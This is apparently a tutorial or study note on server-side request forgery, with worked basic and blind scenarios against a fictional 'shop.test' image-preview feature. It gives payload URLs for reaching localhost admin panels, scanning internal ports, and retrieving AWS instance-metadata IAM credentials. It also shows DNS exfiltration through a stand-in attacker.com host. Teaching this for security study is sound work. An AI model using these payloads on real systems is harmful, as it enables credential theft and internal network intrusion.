# Theory

SSRF (Server-Side Request Forgery) is a security vulnerability where an attacker tricks a server into making HTTP requests on their behalf — to internal services, cloud metadata endpoints, or other resources that should not be publicly accessible. The server acts as a proxy, and since the request originates from the server itself, it bypasses firewalls and access controls that block external clients.

## Key Aspects

	Server acts as the attacker's proxy
	Can reach internal network resources unreachable from outside
	Types: Basic (In-band) SSRF & Blind SSRF

# Scenarios
## Basic (In-band) SSRF

A web application has an "Image Preview" feature that fetches and displays an image from a URL supplied by the user.

URL:
`https://shop.test/preview?url=https://images.external.com/product1.jpg`

The fetched image is rendered directly on the page — the server response is returned to the attacker.

### a. Predict the Backend Behaviour

The server takes the `url` parameter, makes an HTTP GET request to that URL from itself, and returns the response body (image content) to the user's browser.

```
User → shop.test/preview?url=<target> → Server fetches <target> → Returns response to User
```

### b. Modify the request to test for Basic SSRF

- Replace the external URL with `http://localhost` or `http://127.0.0.1` to make the server request itself.

```
https://shop.test/preview?url=http://127.0.0.1
```

```
https://shop.test/preview?url=http://localhost:8080/admin
```

- If the page displays internal content (admin panel HTML, internal API response), the application is **vulnerable to Basic SSRF**.

### c. Conditions required for Basic SSRF

1. The application must accept a **user-controlled URL** as input.
2. The server must make an **outbound HTTP request** to that URL without validating or restricting the destination.
3. The **server's response must be reflected** back to the attacker (this distinguishes Basic from Blind SSRF).
4. The server must have **network access to internal resources** (localhost, internal IPs, cloud metadata) that the attacker cannot reach directly.

> Because the response is returned directly, Basic SSRF allows immediate retrieval of internal data — similar to In-band SQLi.

### d. Craft a payload to access an internal admin panel

Assume the internal admin panel runs on port `8080` and is only accessible from localhost:

```
https://shop.test/preview?url=http://127.0.0.1:8080/admin
```

- The server fetches `http://127.0.0.1:8080/admin` from its own loopback interface.
- The admin panel HTML is returned in the response, **visible to the attacker**.

To scan for other internal services, iterate over ports:

```
https://shop.test/preview?url=http://127.0.0.1:3306   (MySQL)
https://shop.test/preview?url=http://127.0.0.1:6379   (Redis)
https://shop.test/preview?url=http://127.0.0.1:9200   (Elasticsearch)
```

### e. Craft a payload to access cloud instance metadata (AWS)

AWS exposes instance metadata at a link-local address only reachable from the instance itself:

```
https://shop.test/preview?url=http://169.254.169.254/latest/meta-data/
```

- The server, running on an AWS EC2 instance, can reach this address; an external attacker cannot.
- The response lists available metadata keys (e.g., `iam/`, `hostname`, `public-keys/`).

To retrieve IAM credentials (which can be used to access AWS services):

```
https://shop.test/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## Blind SSRF

The same "Image Preview" feature exists, but the application **does not return** the fetched content to the user. It only shows:
- `"Preview loaded successfully"` — if the request succeeded
- `"Could not load preview"` — if the request failed

URL:
`https://shop.test/preview?url=https://images.external.com/product1.jpg`

### a. Predict the Backend Behaviour

The server fetches the supplied URL and checks whether the request succeeded (HTTP 2xx). It **does not return** the response body — only a status message is shown to the user.

```
User → shop.test/preview?url=<target> → Server fetches <target> → Returns only "Success/Fail" to User
```

### b. Modify the request to test for Blind SSRF

Since no response body is returned, the technique is to use an **out-of-band callback server** (e.g., Burp Collaborator or interactsh) to detect whether the server made a request.

```
https://shop.test/preview?url=http://<your-collaborator-id>.burpcollaborator.net
```

- If your collaborator server logs an **incoming HTTP request from shop.test's IP**, the application is **vulnerable to Blind SSRF**.
- No content is needed in the response — just the DNS/HTTP interaction is proof.

Alternatively, test against internal addresses and observe the status message difference:

```
https://shop.test/preview?url=http://127.0.0.1:8080   → "Preview loaded successfully" (port open)
https://shop.test/preview?url=http://127.0.0.1:9999   → "Could not load preview" (port closed)
```

- Differing responses for open vs closed ports allow **internal port scanning**.

### c. Conditions required for Blind SSRF

1. The application must accept a **user-controlled URL** as input.
2. The server must make an **outbound HTTP request** to that URL.
3. The response body is **NOT reflected** to the attacker — only a success/failure indicator (or nothing) is shown.
4. The attacker must use **out-of-band techniques** (callback servers, DNS lookups, timing differences) to confirm the vulnerability.

> Blind SSRF is harder to exploit than Basic SSRF but still dangerous — it can be used for internal network mapping, port scanning, and triggering actions on internal services (e.g., hitting a `DELETE` endpoint on an internal API).

### d. Craft a payload to perform internal port scanning

Iterate over common ports and observe the response message:

```
https://shop.test/preview?url=http://192.168.1.1:22    → "loaded" = SSH open
https://shop.test/preview?url=http://192.168.1.1:3306  → "loaded" = MySQL open
https://shop.test/preview?url=http://192.168.1.1:5432  → "failed" = PostgreSQL closed
```

- Open ports → server successfully connects → **"Preview loaded successfully"**
- Closed ports → connection refused → **"Could not load preview"**
- This allows full **internal network enumeration** with no data returned.

### e. Craft a payload to exfiltrate data via DNS (Out-of-Band)

When even HTTP responses are not visible, embed data in a DNS lookup to an attacker-controlled domain:

```
https://shop.test/preview?url=http://<data>.attacker.com
```

More specifically, some internal services may echo parameters in their response. Combine SSRF with an internal API call whose result is encoded in the subdomain:

```
https://shop.test/preview?url=http://internal-api/user?callback=http://<exfil>.attacker.com
```

- If the internal service makes an outbound request to the `callback` URL, the attacker's DNS/HTTP log reveals the data.
- Check the Burp Collaborator / interactsh dashboard for **incoming DNS queries** containing the exfiltrated value.
